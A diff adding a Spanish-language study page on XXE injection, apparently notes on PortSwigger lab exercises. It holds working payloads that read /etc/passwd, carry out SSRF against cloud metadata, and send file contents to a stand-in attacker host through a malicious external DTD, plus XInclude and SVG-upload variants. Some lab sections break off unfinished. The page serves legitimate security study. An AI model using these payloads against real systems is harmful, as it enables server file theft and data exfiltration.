@@ -1,0 +1,369 @@
+<h2 id="0-índice">0. Índice.</h2>
+
+<ul>
+  <li>1 Concepto de XXE.</li>
+  <li>2 Cómo se plantean las vulnerabilidades XXE.</li>
+  <li>3 Entidades XML.
+    <ul>
+      <li>3.1. Qué es el XML.</li>
+      <li>3.2. Entidades XML.</li>
+      <li>3.3. Definición del tipo de documento.</li>
+      <li>3.4. Entidades comunes XML.</li>
+      <li>3.5. Entidades externas de XML.</li>
+    </ul>
+  </li>
+  <li>4 Tipos de ataques XXE.
+    <ul>
+      <li>4.1. Explotando XXE para recuperar ficheros.</li>
+      <li>4.2. Explotando XXE para realizar ataques SSRF.</li>
+    </ul>
+  </li>
+  <li>5 Blind XXE vulnerabilities.
+    <ul>
+      <li>5.1. Detectando y explotando XXE usando OAST.</li>
+      <li>5.2. Explotando blind XXE para extraer datos via mensajes de error.</li>
+    </ul>
+  </li>
+  <li>6 Encontrando superficie de ataque escondida para XXE injection.</li>
+  <li>7 XXE attacks via file upload.</li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="1-concepto-de-xxe">1. Concepto de XXE.</h3>
+
+<p>XXEi responde a XML eXternal Entity injection. Se trata de una vulnerabilidad web que permite a un atacante interferir con aplicaciones que procesan datos XML, viendo ficheros, interactuando con el back-end, etc.</p>
+
+<p>Por otra parte, el XML es un lenguaje de marcas similar al HTML que se utiliza para almacenar y transferir datos de diversos origenes.</p>
+
+<p><br /></p>
+
+<h3 id="2-cómo-se-plantean-las-vulnerabilidades-xxe">2. Cómo se plantean las vulnerabilidades XXE.</h3>
+
+<p>Como ya hemos comentado antes. algunas páginas web utilizan XML para transmitir datos entre el navegador y el servidor. Esto se puede hacer gracias a un parseador utilizando una librería estándard o una API para procesar el XML en el servidor.</p>
+
+<p>Así, las vulnerabilidades XXE aparecen cuando las especificaciones XML poseen características potencialmente dañinas y el parseador además acepta tales características.</p>
+
+<p><br /></p>
+
+<h3 id="3-entidades-xml">3. Entidades XML.</h3>
+<h4 id="31-qué-es-el-xml">3.1. Qué es el XML.</h4>
+
+<p>XML significa “lenguaje de marcado extensible”. XML es un lenguaje diseñado para almacenar y transportar datos. Al igual que HTML, XML utiliza una estructura en forma de árbol de etiquetas y datos. A diferencia de HTML, XML no utiliza etiquetas predefinidas, por lo que las etiquetas pueden recibir nombres que describen los datos.</p>
+
+<p><br /></p>
+
+<h4 id="32-entidades-xml">3.2. Entidades XML.</h4>
+
+<p><strong>Las entidades XML son una forma de representar un elemento de datos dentro de un documento XML</strong>, en lugar de utilizar los datos en sí. Varias entidades están integradas en la especificación del lenguaje XML. Por ejemplo, las entidades &lt; y &gt; representan los caracteres &lt; y &gt;. Estos son metacaracteres que se utilizan para indicar etiquetas XML y, por lo tanto, generalmente deben representarse mediante sus entidades cuando aparecen dentro de los datos.</p>
+
+<p><br /></p>
+
+<h4 id="33-definición-del-tipo-de-documento">3.3. Definición del tipo de documento.</h4>
+
+<p>La <strong>definición de tipo de documento XML (DTD) contiene declaraciones que pueden definir la estructura de un documento XML</strong>, los tipos de valores de datos que puede contener y otros elementos. La DTD se declara dentro del elemento DOCTYPE opcional al comienzo del documento XML. La DTD puede ser completamente independiente dentro del propio documento (conocido como “DTD interno”) o puede cargarse desde otro lugar (conocido como “DTD externo”) o puede ser un híbrido de los dos.</p>
+
+<p><br /></p>
+
+<h4 id="34-entidades-comunes-xml">3.4. Entidades comunes XML.</h4>
+
+<p>XML permite definir entidades personalizadas dentro de la DTD. Por ejemplo:</p>
+
+<pre><code class="language-XML">&lt;!DOCTYPE foo [ &lt;!ENTITY mientidad "valor de mi entidad" &gt; ]&gt;
+</code></pre>
+
+<p>Esta definición significa que cualquier uso de la referencia a la entidad &amp;myentity; dentro del documento XML se reemplazará con el valor definido: “mi valor de entidad”.</p>
+
+<p><br /></p>
+
+<h4 id="35-entidades-externas-de-xml">3.5. Entidades externas de XML.</h4>
+
+<p>Las entidades externas XML son un tipo de entidad personalizada cuya definición se encuentra fuera de la DTD donde se declaran.</p>
+
+<p>La declaración de una entidad externa utiliza la palabra clave SYSTEM y debe especificar una URL desde la que se debe cargar el valor de la entidad. Es decir, <strong>sirven para almacenar en variables el contenido de algo que no está en el propio documento, como un fichero</strong>. Por ejemplo:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM "http://normal-website.com" &gt;</span> ]&gt;
+</code></pre></div></div>
+
+<p>La URL puede usar el protocolo “file://”, por lo que las entidades externas se pueden cargar desde el archivo. Por ejemplo:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM "file:///path/to/file" &gt;</span> ]&gt;
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h3 id="4-tipos-de-ataques-xxe">4. Tipos de ataques XXE.</h3>
+
+<h4 id="41-explotando-xxe-para-recuperar-ficheros">4.1. Explotando XXE para recuperar ficheros.</h4>
+
+<p>Para llevar a cabo un ataque XXE que obtenga información de un fichero dentro de un sistema de ficheros de un servidor se necesita modificar el fichero XML que se envía de dos maneras:</p>
+
+<ul>
+  <li>
+    <p>Introducir un elemento DOCTYPE que defina una entidad externa conteniendo la ruta del fichero en cuestión.</p>
+  </li>
+  <li>
+    <p>Editar el valor del dato en el XML que se devuelve en la respuesta para hacer uso de la entidad externa definida en el paso anterior.</p>
+  </li>
+</ul>
+
+<p>Supongámos que una aplicación web quiere obtener la cantidad de producto que se tiene en stock y manda un documento XML con la siguiente forma:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;stockCheck&gt;&lt;productId&gt;</span>381<span class="nt">&lt;/productId&gt;&lt;/stockCheck&gt;</span>
+</code></pre></div></div>
+
+<p>Entonces, si la aplicación no tiene mecanismos de defensa contra ataques XXE se puede obtener el contenido del fichero /etc/passwd mediante la siguiente modificación del documentp XML que se va a emitir:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</span> ]&gt;
+<span class="nt">&lt;stockCheck&gt;&lt;productId&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/productId&gt;&lt;/stockCheck&gt;</span>
+</code></pre></div></div>
+
+<p>Así, <strong>se carga a través de la definición de una entidad externa el contenido del fichero /etc/passwd en la variable xxe y luego se envía esta dentro de las etiquetas stockCheck y productId que será devuelta en la respuesta de la aplicación</strong>.</p>
+
+<p>Es conveniente destacar entre el paralelismo que existe entre Directory Traversal y XXE con la salvedad de que uno se utiliza con html y otro con xml.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 1: Exploiting XXE using external entitites to retrieve files</strong></p>
+
+<p>Acudimos a “ver detalles” de cualquier producto de la tienda online e interceptamos la petición tras pulsar el botón de “check stock”.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220421183832.png" text-align="center" />
+</div>
+
+<p>Ahí podemos comprobar que existe código xml que es envíado junto a la petición. De esta forma, vamos a ver si es vulnerable ante un ataque XXE cargando mediante una entidad externa el contenido de un fichero en una variable y definiendo dicha variable en una etiqueta posterior:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220421184141.png" text-align="center" />
+</div>
+
+<p>Al recibir la respuesta mediante el BurpRepeater obtenemos que falta un parámetro:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220421184209.png" text-align="center" />
+</div>
+
+<p>Añadimos la etiqueta de dicho parámetro:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220421184304.png" text-align="center" />
+</div>
+
+<p>Y obtenemos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220421184330.png" text-align="center" />
+</div>
+
+<p>solucionando el laboratorio.</p>
+
+<p><br /></p>
+
+<h4 id="42-explotando-xxe-para-realizar-ataques-ssrf">4.2. Explotando XXE para realizar ataques SSRF.</h4>
+
+<p>Además de obtener información sensible cargándola como entidades externas, otra forma de ataque consiste en realizar una falsificación de una solicitud del servidor que hostea la aplicación, esto es: SSRF. Esta es una vulnerabilidad potencialmente grave en la que se puede inducir a la aplicación del lado del servidor a realizar solicitudes HTTP a cualquier URL a la que pueda acceder el servidor.</p>
+
+<p>Para ello, definimos una entidad XML externa utilizando la URL víctima y utilizar dicha entidad a modod de valor dentro de una etiqueta que posteriormente se devuelve en la respuesta de la aplicación.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"&gt;</span> ]&gt;
+</code></pre></div></div>
+
+<p>De esta forma, se puede ver la respuesta desde la URL dentro de la respuesta de la aplicación web y, por lo tanto, obtener una interacción bidireccional con el sistema de back-end. De lo contrario, solo podrá realizar ataques ciegos SSRF (que aún pueden tener consecuencias críticas).</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 2: Exploiting XXE to perfom SSRF attacks</strong></p>
+
+<p>Este laboratorio simula una aplicación web que contiene una vulnerabilidad XXE en la funcionalidad “Check Stock”. El servidor está corriendo un EC2 metadata endpoint en la URL por defecto, la cual es http://169.254.169.254/.</p>
+
+<p>De esta forma, para hacer que el servidor</p>
+
+<p><br /></p>
+
+<h3 id="5-blind-xxe-vulnerabilities">5. Blind XXE vulnerabilities.</h3>
+
+<p>De nuevo, como en cualquier otro caso, las blind XXE vulnerabilities se plantean existe una vulnerabilidad XXE que no devuelve los datos de la búsqueda perpetrada por el ataque.</p>
+
+<p>Aún así, esta vulnerabilidad sigue siendo explotable. Existen fundamentalmente dos formas de explotar esta vulnerabilidad.</p>
+
+<ul>
+  <li>Empleando técnica OAST.</li>
+  <li>Desencadenando errores que devuelvan información sensible.</li>
+</ul>
+
+<h4 id="51-detectando-y-explotando-xxe-usando-oast">5.1. Detectando y explotando XXE usando OAST.</h4>
+
+<p>A menudo, se pueden detectar Blind XXEi empleando la misma técnica que XXE SSRF poniéndote en contacto con un sistema de tu propio control, en este caso; BurpCollaborator.</p>
+
+<p>Por ejemplo:</p>
+
+<pre><code class="language-XML">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"&gt; ]&gt;
+</code></pre>
+
+<p>Este ataque XXE hace que el servidor realice una solicitud HTTP de back-end a la URL especificada. El atacante puede monitorear la búsqueda DNS resultante y la solicitud HTTP y, por lo tanto, detectar que el ataque XXE fue exitoso.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 3: Blind XXE with out-of-band interaction</strong></p>
+
+<p>Este laboratorio contiene una característica “Check stock” que parsea XML introducido pero no devuelve el resultado por pantalla.</p>
+
+<p>En primer lugar, accedemos al laboratorio y localizamos la funcionalidad en cuestión. Pulsamos el botón e interceptamos la request, añadimos el parámetro anterior y cambiamos el host por el de BurpCollaborator y liberamos la request:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220518133811.png" text-align="center" />
+</div>
+
+<p>Seguidamente, vamos a la pestaña del cliente de BurpCollaborator y comprobamos que efectivamente se ha realizado una búsqueda DNS:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220518133847.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p>A veces, los ataques XXE que utilizan entidades normales se bloquean debido a alguna validación de entrada por parte de la aplicación o algún endurecimiento del analizador XML que se está utilizando.</p>
+
+<p>En esta situación todavía se pueden emplear “XML parameter entities” en su lugar. Estos son un tipo especial de entidades XML que sólo pueden ser referenciados desde otro lugar dentro de la propia DTD</p>
+
+<p>Para esta declaración se necesita tener claro dos cosas:</p>
+
+<ul>
+  <li>En primer lugar, en la declaración de un XML parameter entity incluye el ‘%’ antes del nombre de la entidad:</li>
+</ul>
+
+<pre><code class="language-XML">&lt;!ENTITY % myparameterentity "my parameter entity value" &gt;
+</code></pre>
+
+<ul>
+  <li>La segunda es que cuando se referencian no se emplea el ‘&amp;’, si no el ‘%’:</li>
+</ul>
+
+<pre><code class="language-default">%myparameterentity;
+</code></pre>
+
+<p>De esta forma, se puede utilizar esta entidad en una prueba de OAST de la siguiente manera:</p>
+
+<pre><code class="language-XML">&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"&gt; %xxe; ]&gt;
+</code></pre>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 4: Blind XXE with OAST interaction via XML parameter entities</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad Blind XXE en una característica “Check Stock” que parsea XML input.</p>
+
+<p>En primer lugar, intentamos realizar un OAST mediante una entidad tradicional de XXE. Sin embargo, no obtenemos respuesta. Seguidamente, empelamos un XML parameter entity como el anterior y le ponemos el Host de nuestro BurpCollaborator.</p>
+
+<p><br /></p>
+
+<p>Una vez que hems visto qué dos entidades XML podemos emplear para DETECTAR vulnerabilidades XXE ciegas. Vamos a ver cómo podemos explotar dicha vulnerabilidad para extraer información.</p>
+
+<p>La técnica se basa en construir una DTD maliciosa , como por ejemplo:</p>
+
+<pre><code class="language-XML">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'&gt;"&gt;
+%eval;
+%exfiltrate;
+</code></pre>
+
+<p>Esta DTD lleva a cabo los siguientes pasos:</p>
+
+<ul>
+  <li>Define una entidad de parámetro XML llamada ’file’, que contiene el contenido del ’/etc/passwd’ archivo.</li>
+  <li>Define una entidad de parámetro XML llamada ’eval’, que contiene una declaración dinámica de otra entidad de parámetro XML llamada ’exfiltrate’. La ’exfiltrate’ entidad se evaluará realizando una solicitud HTTP al servidor web del atacante que contiene el valor de la ’file’ entidad dentro de la cadena de consulta de URL.</li>
+  <li>Utiliza la ’eval’ entidad, lo que hace que se realice la declaración dinámica de la ’exfiltrate’ entidad.</li>
+  <li>Utiliza la ’exfiltrate’ entidad, por lo que su valor se evalúa solicitando la URL especificada.</li>
+</ul>
+
+<p>Este DTD debe alojarse dentro de un servidor y al mismo tiempo se debe enviar un payload al sitio web vulnerable</p>
+
+<pre><code class="language-HTML">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"&gt; %xxe;]&gt;
+</code></pre>
+
+<p>para que solicite acceso a dicha DTD y la ejecute línea a línea.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 5: Exploiting blind XXE to exfiltrate data using a malicious external DTD</strong></p>
+
+<p>Este laboratorio contiene una funcionalidad “Check Stock” vulnerable a XXE que no devuelve los resultados.</p>
+
+<p>Para completar este laboratorio hay que recuperar satisfactoriamente el contenido del fichero /etc/hostname.</p>
+
+<p>En primer lugar, accedemos al laboratorio y comprobamos que</p>
+
+<p><br /></p>
+
+<h4 id="52-explotando-blind-xxe-para-extraer-datos-via-mensajes-de-error">5.2. Explotando blind XXE para extraer datos via mensajes de error.</h4>
+
+<p>Otra técnica para explotar una blind XXE vulnerability es intentar parsear un mensaje de error que contenga datos sensibles. Esto sería posible en principio si la aplicación devuelve un mensaje de error en la respuesta.</p>
+
+<p>Por ejemplo, podemos desencadenar un error de parseo XML que contenga el contenido del fichero /etc/passwd con el siguiente DTD:</p>
+
+<pre><code class="language-XML">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
+%eval;
+%error;
+</code></pre>
+
+<p>Así, la DTD anterior describe una entidad, ‘file’ que recoge el contenido de /etc/passwd y otra entidad ‘eval’ que recoge los contenidos de un fichero inexistente que al no existir, desencadena un error provocado por la búsqueda de un fichero cuyo nombre coincide con el nombre del fichero que tiene los contenidos de /etc/passwd.</p>
+
+<p>Así, al ejecutar la DTD se despliega un error que contendrá el nombre del fichero inexistente que será, por otra parte, el contenido de /etc/passwd.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 6: Exploiting blind XXE to retrieve data via error messages</strong></p>
+
+<p>Este laboratorio contiene una funcionalidad vulnerable a blind XXE error message.</p>
+
+<p>En primer lugar, acudimos al laboratorio, a la funcionalidad “CheckStock” vulnerable y procedemos deliberadamente a desencadenar un error. Aplicamos el DTD anterior y le damos a envíar. Debería aparecer un error con el contenido del fichero /etc/passwd.</p>
+
+<p><br /></p>
+
+<h3 id="6-encontrando-superficie-de-ataque-escondida-para-xxe-injection">6. Encontrando superficie de ataque escondida para XXE injection.</h3>
+
+<p>Algunas aplicaciones reciben datos enviados por el cliente, los incrustan en el lado del servidor en un documento XML y luego analizan el documento. Un ejemplo de esto ocurre cuando los datos enviados por el cliente se colocan en una solicitud SOAP de back-end, que luego es procesada por el servicio SOAP de back-end. En esta situación, no puede realizar un ataque XXE clásico, porque no controla todo el documento XML y, por lo tanto, no puede definir ni modificar un elemento ’DOCTYPE’. </p>
+
+<p>Sin embargo, es posible que pueda usar en su  ‘XInclude’ lugar. ’XInclude’ es una parte de la especificación XML que permite crear un documento XML a partir de subdocumentos. Puede colocar un ’ ‘XInclude’ dentro de cualquier valor de datos en un documento XML, por lo que el ataque se puede realizar en situaciones en las que solo controla un único elemento de datos que se coloca en un documento XML del lado del servidor.</p>
+
+<p>Para realizar un ataque ‘XInclude’, debe hacer referencia al espacio de ’XInclude’ nombres y proporcionar la ruta al archivo que desea incluir. Por ejemplo:</p>
+
+<pre><code class="language-XML">&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt; &lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;
+</code></pre>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 7: Exploiting XInclude to retrieve files</strong></p>
+
+<p>Este laboratorio contiene una funcionalidad “Check Stock” que embebe input controlable por el usuario dentro de un documento XML. Podemos aprovechar esto para incrustar una entidad XInclude: 1.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;foo</span> <span class="na">xmlns:xi=</span><span class="s">"http://www.w3.org/2001/XInclude"</span><span class="nt">&gt;&lt;xi:include</span> <span class="na">parse=</span><span class="s">"text"</span> <span class="na">href=</span><span class="s">"file:///etc/passwd"</span><span class="nt">/&gt;&lt;/foo&gt;</span>
+</code></pre></div></div>
+
+<p>Para provocar que el servidor nos devuelva los contenidos de un fichero, en este caso: /etc/passwd.</p>
+
+<p><br /></p>
+
+<h3 id="7-xxe-attacks-via-file-upload">7. XXE attacks via file upload.</h3>
+
+<p>Algunas aplicaciones permiten a los usuarios cargar archivos que luego se procesan en el servidor. Algunos formatos de archivo comunes usan XML o contienen subcomponentes XML. Ejemplos de formatos basados en XML son formatos de documentos de oficina como DOCX y formatos de imagen como SVG.</p>
+
+<p>Por ejemplo, una aplicación podría permitir a los usuarios cargar imágenes y procesarlas o validarlas en el servidor después de cargarlas. Incluso si la aplicación espera recibir un formato como PNG o JPEG, la biblioteca de procesamiento de imágenes que se utiliza puede admitir imágenes SVG. Dado que el formato SVG usa XML, un atacante puede enviar una imagen SVG maliciosa y así alcanzar la superficie de ataque oculta para las vulnerabilidades XXE.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 8: Exploiting XXE via image file upload</strong>.</p>
+
+<p>Este laboratorio permite a los usuarios adjuntar avatares a los comentarios y utiliza la biblioteca Apache Batik para procesar archivos de imagen de avatar.</p>
+
+<p>Para resolver el laboratorio, cargue una imagen que muestre el contenido del archivo /etc/hostname después del procesamiento. Luego use el botón “Enviar solución” para enviar el valor del nombre de host del servidor.</p>
+
+<p>Para resolver este laboratorio cramos un fichero de extensión .svg con el siguiente contenido:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" standalone="yes"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY [xxe](https://portswigger.net/web-security/xxe) SYSTEM "file:///etc/hostname" &gt;</span> ]&gt;<span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">"128px"</span> <span class="na">height=</span><span class="s">"128px"</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span> <span class="na">xmlns:xlink=</span><span class="s">"http://www.w3.org/1999/xlink"</span> <span class="na">version=</span><span class="s">"1.1"</span><span class="nt">&gt;&lt;text</span> <span class="na">font-size=</span><span class="s">"16"</span> <span class="na">x=</span><span class="s">"0"</span> <span class="na">y=</span><span class="s">"16"</span><span class="nt">&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/text&gt;&lt;/svg&gt;</span>
+</code></pre></div></div>
+
